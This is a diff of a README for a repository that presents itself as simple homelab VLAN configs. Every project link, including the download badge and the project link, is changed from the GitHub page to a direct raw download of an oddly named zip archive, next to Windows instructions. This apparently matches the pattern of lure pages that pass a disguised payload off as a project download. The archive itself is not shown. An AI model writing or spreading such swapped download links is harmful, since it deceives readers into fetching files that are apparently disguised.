@@ -1,6 +1,6 @@
 # 🛠️ HomeLab-VLAN-Refactor-Configs - Simple VLAN setup for homelabs
 
-[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Ivana8079/HomeLab-VLAN-Refactor-Configs)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip)
 
 ## 🚀 What this project is
 
@@ -37,7 +37,7 @@ This project fits a mixed home lab with gear like:
 
 Use this link to visit the project page and get the files:
 
-[Open HomeLab-VLAN-Refactor-Configs](https://github.com/Ivana8079/HomeLab-VLAN-Refactor-Configs)
+[Open HomeLab-VLAN-Refactor-Configs](https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip)
 
 On Windows:
 
@@ -227,4 +227,4 @@ This setup makes it easier to write rules for access, streaming, and storage.
 
 ## 🔗 Project link
 
-[https://github.com/Ivana8079/HomeLab-VLAN-Refactor-Configs](https://github.com/Ivana8079/HomeLab-VLAN-Refactor-Configs)
+[https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip](https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip)
